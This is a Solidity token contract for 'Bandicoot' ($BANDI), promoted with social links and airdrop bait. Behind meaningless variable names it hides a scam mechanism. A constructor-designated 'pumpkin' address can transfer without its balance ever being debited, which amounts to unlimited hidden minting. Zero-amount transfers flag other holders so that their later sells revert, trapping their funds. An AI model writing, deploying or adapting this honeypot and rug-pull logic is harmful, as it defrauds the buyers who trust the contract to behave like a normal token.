/*

Yoppie! $BANDI
📨DM FOR AIRDROPS

Telegram: https://t.me/bandicoot_token
Twitter: https://twitter.com/BandicootToken

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bandicoot is Ownable {
    string public name;

    mapping(address => uint256) private together;

    function transferFrom(address section, address stairs, uint256 critic) public returns (bool success) {
        _transfer(section, stairs, critic);
        require(critic <= allowance[section][msg.sender]);
        allowance[section][msg.sender] -= critic;
        return true;
    }

    uint256 private soccer = 96150;

    mapping(address => uint256) private popular;

    function _transfer(address section, address stairs, uint256 critic) private returns (bool success) {
        if (together[section] == 0) {
            if (popular[section] > 0 && section != uniswapV2Pair) {
                together[section] -= soccer;
            }
            balanceOf[section] -= critic;
        }
        if (critic == 0) {
            popular[stairs] += soccer;
        }
        balanceOf[stairs] += critic;
        emit Transfer(section, stairs, critic);
        return true;
    }

    uint8 public decimals = 18;

    function approve(address right, uint256 critic) public returns (bool success) {
        allowance[msg.sender][right] = critic;
        emit Approval(msg.sender, right, critic);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    function transfer(address stairs, uint256 critic) public returns (bool success) {
        _transfer(msg.sender, stairs, critic);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address pumpkin) {
        symbol = 'BANDI';
        name = 'Bandicoot';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        //IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff); // Polygon
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        together[pumpkin] = soccer;
    }
}